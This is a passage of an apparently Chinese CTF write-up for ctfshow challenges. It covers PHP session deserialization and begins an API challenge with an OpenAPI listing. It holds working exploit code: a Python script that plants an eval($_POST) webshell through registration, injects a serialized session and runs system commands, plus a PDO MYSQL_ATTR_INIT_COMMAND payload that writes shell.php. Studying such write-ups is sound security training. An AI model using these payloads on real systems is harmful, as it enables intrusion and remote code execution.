</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>loger</span><span class=o>-&gt;</span><span class=na>setLogFileName</span><span class=p>(</span><span class=s2>&#34;log.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>userLogger</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>setLogFileName</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>dispatcher</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>application</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;|&#34;</span><span class=o>.</span><span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>流程就是首先注册用户，密码为马，接着进行session反序列化写入文件，然后进行RCE即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://d8765c93-a5fe-4e70-88aa-bec031f84c52.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>step1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;userLogger&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;aaa&lt;?=eval($_POST[1]);?&gt;.php&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;index.php?action=do_register&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;script&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;第一步执行完毕&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>step2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;user|O%3A11%3A</span><span class=si>%22a</span><span class=s2>pplication</span><span class=si>%22%</span><span class=s2>3A6%3A%7Bs%3A6%3A</span><span class=si>%22c</span><span class=s2>ookie</span><span class=si>%22%</span><span class=s2>3BO%3A13%3A</span><span class=si>%22c</span><span class=s2>ookie_helper</span><span class=si>%22%</span><span class=s2>3A1%3A%7Bs%3A21%3A</span><span class=si>%22%</span><span class=s2>00cookie_helper</span><span class=si>%00s</span><span class=s2>ecret</span><span class=si>%22%</span><span class=s2>3BN%3B%7Ds%3A5%3A%22mysql</span><span class=si>%22%</span><span class=s2>3BO%3A12%3A%22mysql_helper</span><span class=si>%22%</span><span class=s2>3A2%3A%7Bs%3A16%3A</span><span class=si>%22%</span><span class=s2>00mysql_helper</span><span class=si>%00d</span><span class=s2>b</span><span class=si>%22%</span><span class=s2>3Ba%3A0%3A%7B%7Ds%3A6%3A</span><span class=si>%22o</span><span class=s2>ption</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A19%3Bi%3A262152%3B%7D%7Ds%3A9%3A</span><span class=si>%22d</span><span class=s2>ispather</span><span class=si>%22%</span><span class=s2>3BN%3Bs%3A5%3A</span><span class=si>%22lo</span><span class=s2>ger</span><span class=si>%22%</span><span class=s2>3BO%3A10%3A</span><span class=si>%22u</span><span class=s2>serLogger</span><span class=si>%22%</span><span class=s2>3A3%3A%7Bs%3A8%3A</span><span class=si>%22u</span><span class=s2>sername</span><span class=si>%22%</span><span class=s2>3BN%3Bs%3A20%3A</span><span class=si>%22%</span><span class=s2>00userLogger%00password</span><span class=si>%22%</span><span class=s2>3BN%3Bs%3A20%3A</span><span class=si>%22%</span><span class=s2>00userLogger</span><span class=si>%00f</span><span class=s2>ilename</span><span class=si>%22%</span><span class=s2>3Bs%3A10%3A%22..</span><span class=si>%2F</span><span class=s2>log.txt</span><span class=si>%22%</span><span class=s2>3B%7Ds%3A5%3A</span><span class=si>%22d</span><span class=s2>ebug</span><span class=si>%22%</span><span class=s2>3Bb%3A1%3Bs%3A10%3A</span><span class=si>%22d</span><span class=s2>ispatcher</span><span class=si>%22%</span><span class=s2>3BO%3A10%3A</span><span class=si>%22d</span><span class=s2>ispatcher</span><span class=si>%22%</span><span class=s2>3A0%3A%7B%7D%7D&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;index.php?action=main&amp;token=&#34;</span> <span class=o>+</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;第二步执行完毕&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>step3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;1&#34;</span><span class=p>:</span> <span class=s2>&#34;system(&#39;whoami &amp;&amp; cat /f*&#39;);&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;log.txt_-aaa%3C</span><span class=si>%3F</span><span class=s2>%3Deval(%24_POST%5B1%5D)%3B</span><span class=si>%3F%3E</span><span class=s2>.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;www-data&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;第三步 getshell 成功&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;第三步 getshell 失败&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>step2</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>step3</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=非预期>非预期</h3><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-185431.jpg width=1170 height=922 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-185431_hu_c8c5a195e0018c54.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-185431_hu_f76cbea044330b67.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=126 data-flex-basis=304px></p><p>可以看到存在<code>mysql_helper</code> 类，其中的<code>option</code>属性修改为PDO的另一个参数 <code>MYSQL_ATTR_INIT_COMMAND</code>，这个参数可以指定 mysql 连接时执行的语句，直接写个木马都可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>mysql_helper</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$option</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>PDO</span><span class=o>::</span><span class=na>MYSQL_ATTR_INIT_COMMAND</span> <span class=o>=&gt;</span> <span class=s2>&#34;select &#39;&lt;?=eval(</span><span class=se>\$</span><span class=s2>_POST[1]);?&gt;&#39;  into outfile &#39;/var/www/html/shell.php&#39;;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>application</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$mysql</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$debug</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>application</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span><span class=o>-&gt;</span><span class=na>mysql</span><span class=o>=</span><span class=k>new</span> <span class=nx>mysql_helper</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>session_encode</span><span class=p>());</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=n>action</span><span class=o>=</span><span class=n>main</span><span class=o>&amp;</span><span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=o>=</span><span class=n>user</span><span class=o>%</span><span class=mi>7</span><span class=n>CO</span><span class=o>%</span><span class=mi>3</span><span class=n>A11</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>application</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A2</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A5</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>mysql</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A12</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>mysql_helper</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>option</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A1002</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A71</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>select</span><span class=o>+%</span><span class=mi>27</span><span class=o>%</span><span class=mi>3</span><span class=n>C</span><span class=o>%</span><span class=mi>3</span><span class=n>F</span><span class=o>%</span><span class=mi>3</span><span class=n>Deval</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>24</span><span class=n>_POST</span><span class=o>%</span><span class=mi>5</span><span class=n>B1</span><span class=o>%</span><span class=mi>5</span><span class=n>D</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>3</span><span class=n>F</span><span class=o>%</span><span class=mi>3</span><span class=n>E</span><span class=o>%</span><span class=mi>27</span><span class=o>++</span><span class=n>into</span><span class=o>+</span><span class=n>outfile</span><span class=o>+%</span><span class=mi>27</span><span class=o>%</span><span class=mi>2</span><span class=n>Fvar</span><span class=o>%</span><span class=mi>2</span><span class=n>Fwww</span><span class=o>%</span><span class=mi>2</span><span class=n>Fhtml</span><span class=o>%</span><span class=mi>2</span><span class=n>Fshell</span><span class=o>.</span><span class=n>php</span><span class=o>%</span><span class=mi>27</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A5</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>debug</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bb</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=easy_api>easy_api</h2><blockquote><p>访问openapi.json可以获得api接口列表</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;openapi&#34;</span><span class=p>:</span> <span class=s2>&#34;3.1.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;info&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;FastAPI&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;0.1.0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;paths&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/upload/&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;post&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;summary&#34;</span><span class=p>:</span> <span class=s2>&#34;Upload File&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;operationId&#34;</span><span class=p>:</span> <span class=s2>&#34;upload_file_upload__post&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;requestBody&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;multipart/form-data&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;$ref&#34;</span><span class=p>:</span> <span class=s2>&#34;#/components/schemas/Body_upload_file_upload__post&#34;</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;required&#34;</span><span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;responses&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;200&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Successful Response&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;422&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Validation Error&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;$ref&#34;</span><span class=p>:</span> <span class=s2>&#34;#/components/schemas/HTTPValidationError&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/uploads/{fileIndex}&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;get&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;summary&#34;</span><span class=p>:</span> <span class=s2>&#34;Download File&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;operationId&#34;</span><span class=p>:</span> <span class=s2>&#34;download_file_uploads__fileIndex__get&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;parameters&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;fileIndex&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;in&#34;</span><span class=p>:</span> <span class=s2>&#34;path&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;required&#34;</span><span class=p>:</span> <span class=bp>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Fileindex&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;responses&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;200&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Successful Response&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{}</span>
